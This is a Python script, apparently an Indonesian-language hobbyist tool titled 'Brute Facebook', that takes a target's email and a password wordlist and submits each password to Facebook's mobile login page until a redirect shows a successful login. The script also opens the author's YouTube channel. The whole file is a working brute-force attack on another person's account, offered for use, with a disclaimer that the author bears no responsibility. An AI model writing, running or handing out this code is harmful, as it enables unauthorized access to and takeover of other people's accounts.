#!/bin/usr/python3
# -*- coding: utf-8: -*utf-8

#modules

import requests
import os.path
import os
from os import path
from termcolor import colored, cprint
from pyfiglet import Figlet
import re


#banner


REAPER = ("""
\033[36;1m╔══╗─╔═══╗╔╗─╔╗╔════╗╔═══╗  ╔═══╗╔═══╗╔═══╗╔═══╗╔══╗─╔═══╗╔═══╗╔╗╔═╗
\033[31;1m║╔╗║─║╔═╗║║║─║║║╔╗╔╗║║╔══╝  ║╔══╝║╔═╗║║╔═╗║║╔══╝║╔╗║─║╔═╗║║╔═╗║║║║╔╝
\033[35;1m║╚╝╚╗║╚═╝║║║─║║╚╝║║╚╝║╚══╗  ║╚══╗║║─║║║║─╚╝║╚══╗║╚╝╚╗║║─║║║║─║║║╚╝╝─
\033[34;1m║╔═╗║║╔╗╔╝║║─║║──║║──║╔══╝  ║╔══╝║╚═╝║║║─╔╗║╔══╝║╔═╗║║║─║║║║─║║║╔╗║─
\033[33;1m║╚═╝║║║║╚╗║╚═╝║──║║──║╚══╗  ║║───║╔═╗║║╚═╝║║╚══╗║╚═╝║║╚═╝║║╚═╝║║║║╚╗
\033[32;1m╚═══╝╚╝╚═╝╚═══╝──╚╝──╚═══╝  ╚╝───╚╝─╚╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚╝╚═╝
    \033[36;1m==============\033[35;1m[\033[33;1m*\033[35;1m] \033[33;1mSilahkan Login Bro \033[35;1m[\033[33;1m*\033[35;1m]\033[36;1m===================
    \033[36;1m================\033[35;1m=========================\033[36;1m==================
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mAuthor : Reza Alfauzan                    \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mgithub : Reaper-XD                        \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[33;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mPesan  : Gunakanlah sc dengan bijak!!     \033[36;1m[\033[33;1m*\033[36;1m]  \033[33;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mPesan  : Karena Admin Tidak!!!            \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1m.......: Bertanggung Jawab!!              \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[36;1m===========================================================
    \033[33;1m>~>~>~>~>~>~>~>~>~>~>\033[35;1m~~~~~~~~~~~~~~~~\033[33;1m<~<~<~<~<~<~<~<~<~<~<~
    \033[36;1m<\033[35;1m===================\033[33;1m[ \033[31;1mSilahkan Crack\033[33;1m]\033[35;1m====================\033[36;1m>""")

REZA = ("""
\033[31;1m╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
\033[31;1m║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔══╝║╔═╗║
\033[31;1m║╚═╝║║╚═╝║║║─║║║╚══╗║╚══╗║╚══╗
\033[37;1m║╔══╝║╔╗╔╝║║─║║╚══╗║║╔══╝╚══╗║
\033[37;1m║║───║║║╚╗║╚═╝║║╚═╝║║╚══╗║╚═╝║
\033[37;1m╚╝───╚╝╚═╝╚═══╝╚═══╝╚═══╝╚═══╝

              \033[33;1m╔═╗╔═╗╔══╗╔═╗╔╦╗╔══╗╔═╦╗╔══╗
              \033[32;1m║╔╝║╬║║╔╗║║╔╝║╔╝╚║║╝║║║║║╔═╣
              \033[32;1m║╚╗║╗╣║╠╣║║╚╗║╚╗╔║║╗║║║║║╚╗║
              \033[33;1m╚═╝╚╩╝╚╝╚╝╚═╝╚╩╝╚══╝╚╩═╝╚══╝
""")
#mulai
os.system('xdg-open https://www.youtube.com/channel/UC5zJsltM9leQwjvYqrA_r5Q')
os.system('clear')
print(REAPER)
print('\033[37;1m[\033[31;1m!\033[37;1m]Masukkan Email Target\n')
email = input("\033[31;1mEmail \033[37;1m: ")
print('\033[37;1mMasukkan Wordlist\033[33;1m(\033[31;1mpassword.txt\033[33;1m)')
word = input('\033[31;1mWordlist \033[37;1m: ')
exist = os.path.isfile(word)
if exist == False:
        print('\n[!]Masukkan Wordlists Yang Bener!!!!!')
else:
          url = 'https://m.facebook.com/login.php'
          os.system('clear')
          print(REZA)
          print('\n\033[37;1m[\033[31;1m!\033[37;1m] Gunakanlah Sc Ini Dengan Bijak Karena \033[31;1mAdmin Tidak Bertanggung Jawab\033[31;7m!!')
          print('\n\033[37;1m[\033[31;1m!\033[37;7m]\033[37;1mMulai Crack \033[35;1m: '+ email)
          arq = open(word, 'r').readlines()
          for line in arq:
                password = line.strip()
                http = requests.post(url, data={'email':email, 'pass':password, 'login':'Log In'}, allow_redirects=True)
                content = http.content
                d = http.cookies
                status = http.status_code
                sd = http.url
                if 'home.php'in sd:
                  os.system('clear')
                  print(REZA)
                  print('[+] Password di Temukan!')
                  print('[+] Password Adalah : '+password)
                  exit()
                else:
                  print('\n\033[31;1m(\033[37;1m-\033[31;1m) \033[37;1mPassword Gagal Ditemukan \033[31;1m: '+password)
